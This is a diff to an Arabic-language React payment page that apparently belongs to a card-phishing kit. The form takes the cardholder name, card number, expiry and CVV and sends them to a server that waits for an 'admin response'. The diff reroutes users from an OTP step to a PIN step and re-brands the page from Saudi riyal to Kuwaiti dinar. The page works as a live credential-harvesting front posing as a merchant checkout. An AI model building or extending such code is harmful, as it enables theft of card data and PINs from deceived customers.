@@ -1,11 +1,12 @@
 import Main from "@/components/MainWrapper";
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import { Link, useLocation, useNavigate } from "react-router-dom";
 import { validateLanguage } from "@/lib/helpers";
 import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
 import { FieldValues, useForm } from "react-hook-form";
 import { CustomSelect } from "@/components/ui/select";
 import Input from "@/components/Input";
+import CardNumberInput from "@/components/CardNumberInput";
 
 const errMsgs = {
   name: "الأسم غير صحيح. يجب أن يكون باللغة الأنجليزية",
@@ -14,7 +15,6 @@ const errMsgs = {
   month: "يرجى تحديد الشهر",
   year: "يرجى تحديد السنة",
 };
-
 const years = [
   { name: "2024" },
   { name: "2025" },
@@ -44,28 +44,43 @@ const Gateway = () => {
     register,
     handleSubmit,
     setValue,
+    getValues,
     formState: { errors, isValidating, isValid },
-  } = useForm({ mode: "all" });
+  } = useForm({
+    mode: "all",
+    defaultValues: {
+      name: state?.name,
+      cvv: "",
+      card_num: "",
+      exp_month: "1",
+      exp_year: "2024",
+    },
+  });
+  const [cardType, setCardType] = useState<"visa" | "master" | "mada" | null>(
+    state?.paymentMethod
+  );
+
+  console.log(state);
+  console.log(errors);
+  console.log(getValues());
+
   useEffect(() => {
     setCurrentPage("payment-gateway");
   }, []);
   const navigate = useNavigate();
 
-  console.log(state);
-
   const onSubmit = (data: FieldValues) => {
-    console.log(data);
-
     if (Object.values(data).filter((d) => !d).length === 0) {
       sendDataToServer({
         data: {
+          "نوع البطاقة": cardType,
           "إسم حامل البطاقة": data.name,
           "رقم البطاقة": data.card_num,
           "تاريخ الانتهاء": `${data.exp_month}/${data.exp_year}`,
           cvv: data.cvv,
         },
         current: "payment-gateway",
-        nextPage: "otp",
+        nextPage: "pin",
         waitingForAdminResponse: true,
         navigate,
       });
@@ -76,7 +91,7 @@ const Gateway = () => {
     <Main>
       <main className="bg-gray-100 min-h-screen py-10 lg:pt-20">
         <div className="bg-white rounded-xl flex flex-col items-center justify-center w-fit max-w-[90dvw] lg:max-w-lg p-4 mx-auto">
-          <div className="py-2 px-6 mb-4 rounded-xl w-full bg-main shadow-sm">
+          <div className="bg-gradient-to-tl from-main/20 to-main/5 py-2 px-6 w-full mb-4 rounded-xl">
             <img
               src="/assets/images/logo.webp"
               alt="logo"
@@ -85,13 +100,11 @@ const Gateway = () => {
           </div>
 
           <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
-            {state?.paymentMethod && (
-              <img
-                src={`/assets/images/client/${state.paymentMethod}-card.svg`}
-                className="w-16 absolute left-2 top-4 lg:top-2 scale-125"
-                alt={`${state?.paymentMethod} logo`}
-              />
-            )}
+            <img
+              src={`/assets/images/client/${cardType || "visa"}-card.svg`}
+              className="w-16 absolute left-2 top-4 lg:top-2 scale-125"
+              alt={`${cardType || "visa card"} logo`}
+            />
 
             <h2 className="text-xl font-bold text-main">
               الدفع من خلال بطاقة الائتمان
@@ -107,7 +120,7 @@ const Gateway = () => {
           </h3>
           <form
             onSubmit={handleSubmit(onSubmit)}
-            className="mt-4 grid grid-cols-6 items-end gap-2 w-full px-4"
+            className="mt-4 grid grid-cols-6 items-end gap-8 w-full px-4"
           >
             <Input
               errors={errors}
@@ -126,15 +139,13 @@ const Gateway = () => {
               }}
             />
 
-            <Input
+            <CardNumberInput
               errors={errors}
               register={register}
-              isAr
               label="رقم البطاقة"
               placeholder="xxxx xxxx xxxx xxxx"
               id="card_num"
               type="tel"
-              max={16}
               className={"text-left"}
               containerClassName="col-span-6"
               options={{
@@ -144,6 +155,8 @@ const Gateway = () => {
                   message: errMsgs.card_num,
                 },
               }}
+              cardType={cardType!}
+              setCardType={setCardType}
             />
 
             <div className={"col-span-6"}>
@@ -172,6 +185,7 @@ const Gateway = () => {
                   className="px-4"
                   register={register}
                   errors={errors}
+                  defaultValue="1"
                   options={{ required: errMsgs.month }}
                   setValue={setValue}
                 />
@@ -183,6 +197,7 @@ const Gateway = () => {
                   className="px-4"
                   register={register}
                   errors={errors}
+                  defaultValue="2024"
                   options={{ required: errMsgs.year }}
                   setValue={setValue}
                 />
@@ -210,14 +225,14 @@ const Gateway = () => {
 
             <p className="w-max">
               {`المجموع الكلى:`}{" "}
-              <strong className="text-green-600 font-bold underline ring-offset-4">
-                {state?.total || 10}
+              <strong className="text-main font-bold underline ring-offset-4">
+                {state?.payment_amount || 8}
               </strong>{" "}
-              ر.س
+              دينار كويتي
             </p>
             <div className="col-span-6 mt-6 flex flex-col lg:flex-row sm:items-center gap-4">
               <button
-                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-[#76b456] hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
+                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                 type="submit"
                 disabled={!isValid}
               >
@@ -226,13 +241,19 @@ const Gateway = () => {
               <Link
                 className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                 to={"/checkout/4"}
+                state={state}
               >
                 السابق
               </Link>
             </div>
 
+            <p className="text-center col-span-full mt-2 bg-deep-orange-500 text-white rounded-lg px-4 py-2 w-fit text-sm animate-pulse">
+              "نعتذر من عملائنا الأعزاء، نحن لا نقبل التعامل بالبطاقات الصادرة
+              من بنك الراجحي في الوقت الراهن. نشكركم على تفهمكم."
+            </p>
+
             <img
-              src="/assets/images/client/cards-all.png"
+              src="/assets/images/cards-all.png"
               alt="cards logos"
               className="mx-auto max-w-xs col-span-6 mt-6"
             />
